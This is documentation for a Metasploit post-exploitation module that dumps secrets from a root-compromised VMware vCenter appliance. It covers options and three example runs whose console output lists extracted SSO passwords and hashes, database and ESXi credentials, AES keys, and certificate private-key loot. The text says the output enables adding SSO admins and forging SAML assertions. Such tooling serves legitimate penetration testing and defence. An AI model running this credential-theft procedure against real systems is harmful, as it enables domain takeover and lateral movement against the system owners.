## Vulnerable Application

Grab secrets and keys from the vCenter server and add them to loot. Secrets include the dcAccountDN
and dcAccountPassword for the vCenter machine which can be used for manipulating the SSO domain via
standard LDAP interface; good for plugging into the vmware_vcenter_vmdir_ldap module or for adding
new SSO admin users. The MACHINE_SSL, VMCA_ROOT and SSO IdP certificates with associated private keys
are also plundered and can be used to sign forged SAML assertions for the /ui admin interface.

## Vulnerable Application

This module is tested against the vCenter appliance only; it will not work on Windows vCenter
instances. It is intended to be run after successfully acquiring root access on a vCenter appliance
and is useful for penetrating further into the environment following a vCenter exploit that results
in a root shell. This module has been tested against vCenter appliance versions 7.0 and 6.7 but will
probably work against other versions of vCenter appliance.

## Verification Steps

This is a post module and requires a meterpreter or shell session on the vCenter appliance with root
access.

1. Start msfconsole
2. Get session on vCenter appliance via exploit of your choice and background it
3. Do: `use post/linux/gather/vcenter_secrets_dump`
4. Do: `set session <session>`
5. Do: `dump`

## Options

## Advanced Options

### DUMP_VMDIR

Boolean value that controls whether the module will attempt to extract vSphere SSO domain
information, including SSO user hashes and a complete LDIF dump of the SSO directory. Defaults
to true.

### DUMP_VMAFD

Boolean value that controls whether the module will attempt to extract vSphere certificates, private
keys, and secrets. Defaults to true.

### DUMP_SPEC

If DUMP_VMAFD is also true, attempt to extract VM Guest Customization secrets from PSQL using the
DATA-ENCIPHERMENT key extracted from VMAFD. Defaults to true.

## Scenarios

Example run from meterpreter session on vCenter appliance version 7.0 U3d

```
msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
session => 1
msf6 post(linux/gather/vcenter_secrets_dump) > dump

[*] vSphere Hostname and IPv4: vcenterdelta.cesium137.io [192.168.100.70]
[*] VMware VirtualCenter 7.0.3 build-19480866
[*] Embedded Platform Service Controller
[*] Gathering vSphere SSO domain information ...
[+] vSphere SSO DC DN: cn=vcenterdelta.cesium137.io,ou=Domain Controllers,dc=delta,dc=vsphere,dc=local
[+] vSphere SSO DC PW: *6{ K3Ei*@<J[.gd5c3o
[*] Extract vmdird tenant AES encryption key ...
[+] vSphere Tenant AES encryption
        KEY: K-Z(x7wf35{E"I2v
        HEX: 4b2d5a287837776633357b4522493276
[*] Extract vmware-vpx AES key ...
[+] vSphere vmware-vpx AES encryption
        HEX: 9927ed2d42b80f9d3eec8e77441c63360c0c7bbed48076ff884efcfd27ef0682
[*] Extracting PostgreSQL database credentials ...
[+]     VCDB Name: VCDB
[+]     VCDB User: vc
[+]     VCDB Pass: 6!24A3W5LekCOPK=
[*] Extract ESXi host vpxuser credentials ...
[+] ESXi Host esxi01d.cesium137.io [192.168.100.101]    LOGIN: vpxuser PASS: 3be=IDc}11FC8EJ1^JgBO]Bl7I8}^:]Z
[+] ESXi Host esxi02d.cesium137.io [192.168.100.102]    LOGIN: vpxuser PASS: 1gp0o7o[~/Fk^1bqm0K1K\YIl.VsgTK8
[*] Extracting vSphere SSO domain secrets ...
[*] Dumping vmdir schema to LDIF ...
[+] LDIF Dump: /home/cs137/.msf4/loot/20220504162039_default_192.168.100.70_vmdir_227362.ldif
[*] Processing vmdir LDIF (this may take several minutes) ...
[*] Processing LDIF entries ...
[*] Processing SSO account hashes ...
[+] vSphere SSO User Credential: CN=workload_storage_management-07afcee6-c2e2-4d0a-aa28-0305ab5825a4,cn=ServicePrincipals,dc=delta,dc=vsphere,dc=local:$dynamic_82$4bb329cd5a078c7b22b2f2bafd65f1c58e523d2d3f85ff75f51763d32c2769893a5fdb35e36e4217f1dcc9e10f1cfdaf495fdcc9ea5bf3fbfd8017bd57614d05$HEX$050a7a45b3ad8ee24a815b41c94b5fc9
[+] vSphere SSO User Credential: cn=vcenterdelta.cesium137.io,ou=Domain Controllers,dc=delta,dc=vsphere,dc=local:$dynamic_82$d857c278b1dfa799e293f0f35551d29b01973c24ef9e2c0e079d09049826ca824757f8377e7646e003272a39ae459a66c5fca54ac76eb67ddc5d1133cb4c4628$HEX$4ae8badb536deab2c3be64d3a1dfeb2e
[+] vSphere SSO User Credential: CN=waiter-0ad33e8d-0ca0-4912-8eb0-0a80a16fda82,cn=users,dc=delta,dc=vsphere,dc=local:$dynamic_82$9a9dd8ec92a332b91b7602d45404a144973c75f54111ecf7cdfa70cea29e358838132f8380361091a40efdf52c5ac34cfd988574e489a83e2c1f1438c764bad0$HEX$2971d8fd5160de2e71a0dfa744af5d6b
[+] vSphere SSO User Credential: cn=krbtgt/DELTA.VSPHERE.LOCAL,cn=users,dc=DELTA,dc=VSPHERE,dc=LOCAL:$dynamic_82$41437d26f1d4c2cdc67cff7ec66f91da643cb4b331fc00fa052ace43e4eae7ef277f9b9b05d5c06c46f5b73bc2132ed772552274464098d2479604161a001d32$HEX$5a21a4b810348c78f9997a3c405f3340
[+] vSphere SSO User Credential: cn=K/M,cn=users,dc=DELTA,dc=VSPHERE,dc=LOCAL:$dynamic_82$aa0ef201580566738898162a079c70daa0bb19be0927d6b44ac3d65724df1e14cd6c273c132cd117b98ed8c7b37d2ae861d96e6ff28e97e81f54629072a83e62$HEX$031df0af1964ea1e5c733541f2f89a7d
[+] vSphere SSO User Credential: cn=Administrator,cn=Users,dc=delta,dc=vsphere,dc=local:$dynamic_82$cd4362341bb01e2de096c262c59e3c6f8bedf78ae96f378de57e369d5071f114fba4c43c4d577317ea3d923eafa9b9a6f6154a10d0e81f7fa00fb711b3519a8c$HEX$0155fb261f868fbf8f3feda9139acc50
[+] vSphere SSO User Credential: cn=vmca/vcenterdelta.cesium137.io@DELTA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=delta,dc=vsphere,dc=local:$dynamic_82$b478eb780a9f43960541a236b4f258bf9d7726f76d6f9d13f25fc815bac002b191be96a90c87bf607b54e13769878b5863cde7eb12b151db5c5892e9b00e5f48$HEX$a56c39678fd290619f726e31c5d6fce8
[+] vSphere SSO User Credential: cn=ldap/vcenterdelta.cesium137.io@DELTA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=delta,dc=vsphere,dc=local:$dynamic_82$efeb6777719ccb7278a6c216e3a307bc0a4a9ecbf240a36a6947161dbd44e143cb8fa9712f2629e7022bb2bcdf3c144b7ecbbc499f15dd3791e920205ec7fcba$HEX$bb3eddcba08bf93c372f23a45c5fb651
[+] vSphere SSO User Credential: cn=DNS/vcenterdelta.cesium137.io@DELTA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=delta,dc=vsphere,dc=local:$dynamic_82$059761db3117ce52c864cf5dab7b6320f47d0e09c1ff3afaa0835fe4775aa0669a09ee26412e15bfc8337a9747e73e4ffab1859292e716dba0e92104708332a6$HEX$4629f7e9c587f6d1b57b2f56e96bf05a
[+] vSphere SSO User Credential: cn=host/vcenterdelta.cesium137.io@DELTA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=delta,dc=vsphere,dc=local:$dynamic_82$6b11a2b58752e8409f57bc72b45e6599209714000b8a17e95d661663d54d691ce013be2700fa6c8e30e6d98259d1810c5f883fcc8099bd16342e6a4c0d179895$HEX$2a14a8f480ca071f6edffd3720732d5d
[*] Processing SSO identity sources ...
[*] Found SSO Identity Source Credential:
[+] IDENTITY_STORE_TYPE_VMWARE_DIRECTORY @ ldap://vcenterdelta.cesium137.io:389:
[+]       SSOUSER: vcenterdelta.cesium137.io@delta.vsphere.local
[+]       SSOPASS: *6{ K3Ei*@<J[.gd5c3o
[+]     SSODOMAIN: delta.vsphere.local
[*] Found SSO Identity Source Credential:
[+] IDENTITY_STORE_TYPE_LDAP_WITH_AD_MAPPING @ ldap://cesium137.io:
[+]       SSOUSER: CESIUM137\ldap
[+]       SSOPASS: ThisIsSecret!
[+]     SSODOMAIN: cesium137.io
[*] Extracting certificates from vSphere platform ...
[+] VMCA_ROOT key: /home/cs137/.msf4/loot/20220504162042_default_192.168.100.70_vmca_603049.key
[+] VMCA_ROOT cert: /home/cs137/.msf4/loot/20220504162042_default_192.168.100.70_vmca_882434.pem
[+] SSO_STS_IDP key: /home/cs137/.msf4/loot/20220504162044_default_192.168.100.70_idp_836918.key
[+] SSO_STS_IDP cert: /home/cs137/.msf4/loot/20220504162044_default_192.168.100.70_idp_500987.pem
[+] MACHINE_SSL_CERT key: /home/cs137/.msf4/loot/20220504162046_default_192.168.100.70___MACHINE_CERT_032048.key
[+] MACHINE_SSL_CERT cert: /home/cs137/.msf4/loot/20220504162047_default_192.168.100.70___MACHINE_CERT_559717.pem
[+] MACHINE key: /home/cs137/.msf4/loot/20220504162050_default_192.168.100.70_machine_503081.key
[+] MACHINE cert: /home/cs137/.msf4/loot/20220504162051_default_192.168.100.70_machine_646697.pem
[+] VSPHERE-WEBCLIENT key: /home/cs137/.msf4/loot/20220504162052_default_192.168.100.70_vspherewebclien_812043.key
[+] VSPHERE-WEBCLIENT cert: /home/cs137/.msf4/loot/20220504162053_default_192.168.100.70_vspherewebclien_959067.pem
[+] VPXD key: /home/cs137/.msf4/loot/20220504162055_default_192.168.100.70_vpxd_194878.key
[+] VPXD cert: /home/cs137/.msf4/loot/20220504162056_default_192.168.100.70_vpxd_153814.pem
[+] VPXD-EXTENSION key: /home/cs137/.msf4/loot/20220504162057_default_192.168.100.70_vpxdextension_878062.key
[+] VPXD-EXTENSION cert: /home/cs137/.msf4/loot/20220504162058_default_192.168.100.70_vpxdextension_623838.pem
[+] HVC key: /home/cs137/.msf4/loot/20220504162100_default_192.168.100.70_hvc_452066.key
[+] HVC cert: /home/cs137/.msf4/loot/20220504162100_default_192.168.100.70_hvc_307290.pem
[+] DATA-ENCIPHERMENT key: /home/cs137/.msf4/loot/20220504162102_default_192.168.100.70_dataenciphermen_478118.key
[+] DATA-ENCIPHERMENT cert: /home/cs137/.msf4/loot/20220504162103_default_192.168.100.70_dataenciphermen_345609.pem
[+] SMS key: /home/cs137/.msf4/loot/20220504162105_default_192.168.100.70_sms_self_signed_858005.key
[+] SMS cert: /home/cs137/.msf4/loot/20220504162106_default_192.168.100.70_sms_self_signed_095121.pem
[+] WCP key: /home/cs137/.msf4/loot/20220504162108_default_192.168.100.70_wcp_982089.key
[+] WCP cert: /home/cs137/.msf4/loot/20220504162108_default_192.168.100.70_wcp_984591.pem
[*] Searching for secrets in VM Guest Customization Specification XML ...
[*] Processing vpx_customization_spec 'Good Win10 Template with Local and Domain Join' ...
[*] Validating data encipherment key ...
[*] Initial administrator account password found for vpx_customization_spec 'Good Win10 Template with Local and Domain Join':
[+]     Initial Admin PW: SamIAm!
[*] AD domain join account found for vpx_customization_spec 'Good Win10 Template with Local and Domain Join':
[+]     AD User: administrator@cesium137.io
[+]     AD Pass: IAmSam!
[*] Processing vpx_customization_spec 'Borked Win10 Template' ...
[*] Validating data encipherment key ...
[!] Could not associate encryption public key with any of the private keys extracted from vCenter, skipping
[*] Processing vpx_customization_spec 'Good Win10 Template with Local' ...
[*] Validating data encipherment key ...
[*] Initial administrator account password found for vpx_customization_spec 'Good Win10 Template with Local':
[+]     Initial Admin PW: SamIAm!
[*] Post module execution completed
msf6 post(linux/gather/vcenter_secrets_dump) > 
```

Example run from meterpreter session on vCenter appliance version 6.0 U3j

```
msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
session => 1
msf6 post(linux/gather/vcenter_secrets_dump) > dump

[*] vSphere Hostname and IPv4: vcenteralpha.cesium137.io [192.168.100.60]
[*] VMware VirtualCenter 6.0.0 build-14510547
[*] Embedded Platform Service Controller
[*] Gathering vSphere SSO domain information ...
[+] vSphere SSO DC DN: cn=vcenteralpha.cesium137.io,ou=Domain Controllers,dc=alpha,dc=vsphere,dc=local
[+] vSphere SSO DC PW: <PMW{T:4mnb@UBs/$f(w
[*] Extract vmdird tenant AES encryption key ...
[+] vSphere Tenant AES encryption
        KEY: (>d%>D3'i@rAj}!"
        HEX: 283e64253e443327694072416a7d2122
[*] Extract vmware-vpx AES key ...
[+] vSphere vmware-vpx AES encryption
        HEX: acdeb90515681eb8c357e3a94312106934f174324c39d1deb012337effc124de
[*] Extracting PostgreSQL database credentials ...
[+]     VCDB Name: VCDB
[+]     VCDB User: vc
[+]     VCDB Pass: 4yFcqZ2$m^&H<K?z
[*] Extract ESXi host vpxuser credentials ...
[!] No ESXi hosts attached to this vCenter system
[*] Extracting vSphere SSO domain secrets ...
[*] Dumping vmdir schema to LDIF ...
[+] LDIF Dump: /home/cs137/.msf4/loot/20220504162417_default_192.168.100.60_vmdir_757761.ldif
[*] Processing vmdir LDIF (this may take several minutes) ...
[*] Processing LDIF entries ...
[*] Processing SSO account hashes ...
[+] vSphere SSO User Credential: cn=vcenteralpha.cesium137.io,ou=Domain Controllers,dc=alpha,dc=vsphere,dc=local:$dynamic_82$95fe2a1c250329ff99f3ebf364a58f1ee4263560c30c8010c9774b4f5bf151ef3df4b378ab88a2e3629f714ed1b0060f3ae10b7bd7533d025f47d33542bf8ade$HEX$28d03ba88a83c83ae1d999b77259670c
[+] vSphere SSO User Credential: CN=waiter 514f2778-d8c0-49aa-a10b-1951699cc8c6,cn=users,dc=alpha,dc=vsphere,dc=local:$dynamic_82$495c53a6dd4b813638608feb0b4a1b27045d41e36e798c68ebdb312edc2f16c77d780c2b4fc6bed438cfd0ef743f1c1e0363692bd2c195371c2d4dd0b9862f39$HEX$b74fe42af9579d6c5536a50872c9eedf
[+] vSphere SSO User Credential: cn=krbtgt/ALPHA.VSPHERE.LOCAL,cn=users,dc=ALPHA,dc=VSPHERE,dc=LOCAL:$dynamic_82$1c01a034aadd563bea5be04b9e74dbc5bb9ac37694f58bda6eea0e83df97bc64e5fdf932991a9bcaaf82da6300542e8d8d51c16282e9aaa08da2c6c65a8b7cdc$HEX$2434b5c538e31bb3854bcd277a5f63ab
[+] vSphere SSO User Credential: cn=K/M,cn=users,dc=ALPHA,dc=VSPHERE,dc=LOCAL:$dynamic_82$525d688d4614db9939ffdba8e41e76bc3bd473b0cc4fdeac0994042d3a5a7adc9c8e46040c846d6c7f449f7f94f9d3370cc554ab668dcd3d1006ca38a60fb70d$HEX$fd6001dd5be548498d94bf08641d657d
[+] vSphere SSO User Credential: cn=Administrator,cn=Users,dc=alpha,dc=vsphere,dc=local:$dynamic_82$3a4fc4fbacbc6d10e4787383841ebc38fc20ebbb7780692ee0c5fa4b1a2bd675b7c41e8604f4a0eba9546993b971790115279281a108e6e21f4b83740fae449f$HEX$db1d08918cc2eb7bb372545b449643ca
[+] vSphere SSO User Credential: cn=vmca/vcenteralpha.cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$6d7a381d442a674bcc730604160c6963adc937a45a14b9d8e750b55fd3500e54c1bd739968a611a63f747db0ebbe8d31f0d96e5b84a2d72c3c79f922e922adc7$HEX$68fbf3edaba87c972f2423d670377cd7
[+] vSphere SSO User Credential: cn=ldap/vcenteralpha.cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$f584f632b79113f1a5f31d0d8e1df094438fd1644140fd3692a880e4c3ddb8a25969a71ec0e10b31c61aa256217cc0e4c014a21350645b2a3fb7327d0ee5f96a$HEX$9cfee2bcd297134f1d5a921c20f373e8
[+] vSphere SSO User Credential: cn=host/vcenteralpha.cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$ac83726dabc4a021b7737b1e696eba9067e73fc8058e719733b2f4ebded115ae653dd75f13ec26b6a641986c772b20bf37be999c9978d220e94f1d0eeab9d3b8$HEX$91dae8ef6feae8880dd9708664040598
[*] Processing SSO identity sources ...
[*] Found SSO Identity Source Credential:
[+] IDENTITY_STORE_TYPE_VMWARE_DIRECTORY @ ldap://localhost:389:
[+]       SSOUSER: cn=vcenteralpha.cesium137.io,ou=Domain Controllers,DC=alpha,DC=vsphere,DC=local
[+]       SSOPASS: <PMW{T:4mnb@UBs/$f(w
[+]     SSODOMAIN: alpha.vsphere.local
[*] Extracting certificates from vSphere platform ...
[+] VMCA_ROOT key: /home/cs137/.msf4/loot/20220504162419_default_192.168.100.60_vmca_525753.key
[+] VMCA_ROOT cert: /home/cs137/.msf4/loot/20220504162419_default_192.168.100.60_vmca_840227.pem
[!] vmwSTSPrivateKey was not found in vmdir, checking for legacy ssoserverSign key PEM files ...
[-] Unable to query IDM tenant information, cannot validate ssoserverSign certificate against IDM
[!] Could not reconcile vmdir STS IdP cert chain with cert chain advertised by IDM - this credential may not work
[+] SSO_STS_IDP key: /home/cs137/.msf4/loot/20220504162421_default_192.168.100.60_idp_482598.key
[+] SSO_STS_IDP cert: /home/cs137/.msf4/loot/20220504162421_default_192.168.100.60_idp_805228.pem
[+] MACHINE_SSL_CERT key: /home/cs137/.msf4/loot/20220504162424_default_192.168.100.60___MACHINE_CERT_193219.key
[+] MACHINE_SSL_CERT cert: /home/cs137/.msf4/loot/20220504162424_default_192.168.100.60___MACHINE_CERT_071831.pem
[+] MACHINE key: /home/cs137/.msf4/loot/20220504162428_default_192.168.100.60_machine_480281.key
[+] MACHINE cert: /home/cs137/.msf4/loot/20220504162428_default_192.168.100.60_machine_368258.pem
[+] VSPHERE-WEBCLIENT key: /home/cs137/.msf4/loot/20220504162430_default_192.168.100.60_vspherewebclien_464390.key
[+] VSPHERE-WEBCLIENT cert: /home/cs137/.msf4/loot/20220504162431_default_192.168.100.60_vspherewebclien_445076.pem
[+] VPXD key: /home/cs137/.msf4/loot/20220504162432_default_192.168.100.60_vpxd_397207.key
[+] VPXD cert: /home/cs137/.msf4/loot/20220504162433_default_192.168.100.60_vpxd_425995.pem
[+] VPXD-EXTENSION key: /home/cs137/.msf4/loot/20220504162435_default_192.168.100.60_vpxdextension_185899.key
[+] VPXD-EXTENSION cert: /home/cs137/.msf4/loot/20220504162436_default_192.168.100.60_vpxdextension_485039.pem
[+] SMS key: /home/cs137/.msf4/loot/20220504162437_default_192.168.100.60_sms_self_signed_823426.key
[+] SMS cert: /home/cs137/.msf4/loot/20220504162438_default_192.168.100.60_sms_self_signed_711433.pem
[*] Searching for secrets in VM Guest Customization Specification XML ...
[!] No vpx_customization_spec entries evident
[*] Post module execution completed
msf6 post(linux/gather/vcenter_secrets_dump) >
```

Example run from meterpreter session on vCenter appliance version 6.5 U3q, configured with an external PSC

```
msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
session => 1
msf6 post(linux/gather/vcenter_secrets_dump) > dump

[*] vSphere Hostname and IPv4: vctr01.cesium137.io [192.168.0.111]
[*] VMware VirtualCenter 6.5.0 build-18499837
[!] External Platform Service Controller: psc01.cesium137.io
[!] This module assumes embedded PSC, functionality will be limited
[*] Gathering vSphere SSO domain information ...
[+] vSphere SSO DC DN: cn=vctr01.cesium137.io,ou=Computers,dc=vsphere,dc=local
[+] vSphere SSO DC PW: *Pz[aO0Udli"%mbt%`Gn
[*] Extract vmware-vpx AES key ...
[+] vSphere vmware-vpx AES encryption
        HEX: db5beca47d9bb7af5da5278aeeee4b0a83076670736c46546f77a1ddfbe54f2e
[*] Extracting PostgreSQL database credentials ...
[+]     VCDB Name: VCDB
[+]     VCDB User: vc
[+]     VCDB Pass: cq1=+*f(gTQZ_6)Y
[*] Extract ESXi host vpxuser credentials ...
[+] ESXi Host esxi01.cesium137.io [192.168.0.101]  LOGIN: vpxuser PASS: 13M\.3LCb36n8:=_847HzS}U:c9@d65=
[+] ESXi Host esxi02.cesium137.io [192.168.0.102]  LOGIN: vpxuser PASS: -0fQviFI0f}C@8:v3y[jP[\C{lqU8.kL
[+] ESXi Host esxi03.cesium137.io [192.168.0.103]  LOGIN: vpxuser PASS: .TB4/OEr3H^pM.kj4a^-]0Z:_TWl{=_H
[*] Extracting vSphere SSO domain secrets ...
[*] Dumping vmdir schema to LDIF ...
[+] LDIF Dump: /home/cs137/.msf4/loot/20220505083154_default_192.168.0.111_vmdir_383063.ldif
[*] Processing vmdir LDIF (this may take several minutes) ...
[*] Processing LDIF entries ...
[*] Processing SSO account hashes ...
[!] No password hashes found
[*] Processing SSO identity sources ...
[!] No SSO ID provider information found
[*] Extracting certificates from vSphere platform ...
[+] MACHINE_SSL_CERT key: /home/cs137/.msf4/loot/20220505083156_default_192.168.0.111___MACHINE_CERT_323341.key
[+] MACHINE_SSL_CERT cert: /home/cs137/.msf4/loot/20220505083156_default_192.168.0.111___MACHINE_CERT_255826.pem
[+] MACHINE key: /home/cs137/.msf4/loot/20220505083158_default_192.168.0.111_machine_248465.key
[+] MACHINE cert: /home/cs137/.msf4/loot/20220505083159_default_192.168.0.111_machine_130920.pem
[+] VSPHERE-WEBCLIENT key: /home/cs137/.msf4/loot/20220505083200_default_192.168.0.111_vspherewebclien_019114.key
[+] VSPHERE-WEBCLIENT cert: /home/cs137/.msf4/loot/20220505083201_default_192.168.0.111_vspherewebclien_777853.pem
[+] VPXD key: /home/cs137/.msf4/loot/20220505083202_default_192.168.0.111_vpxd_846784.key
[+] VPXD cert: /home/cs137/.msf4/loot/20220505083202_default_192.168.0.111_vpxd_796349.pem
[+] VPXD-EXTENSION key: /home/cs137/.msf4/loot/20220505083204_default_192.168.0.111_vpxdextension_570408.key
[+] VPXD-EXTENSION cert: /home/cs137/.msf4/loot/20220505083204_default_192.168.0.111_vpxdextension_490761.pem
[+] SMS key: /home/cs137/.msf4/loot/20220505083206_default_192.168.0.111_sms_self_signed_278681.key
[+] SMS cert: /home/cs137/.msf4/loot/20220505083206_default_192.168.0.111_sms_self_signed_163386.pem
[*] Searching for secrets in VM Guest Customization Specification XML ...
[*] Processing vpx_customization_spec 'Windows 2019 Datacenter' ...
[*] Validating data encipherment key ...
[*] Initial administrator account password found for vpx_customization_spec 'Windows 2019 Datacenter':
[+]     Initial Admin PW: IAmSam!
[*] AD domain join account found for vpx_customization_spec 'Windows 2019 Datacenter':
[+]     AD User: sam@cesium137.io
[+]     AD Pass: Gr33n3gg$!
[*] Post module execution completed
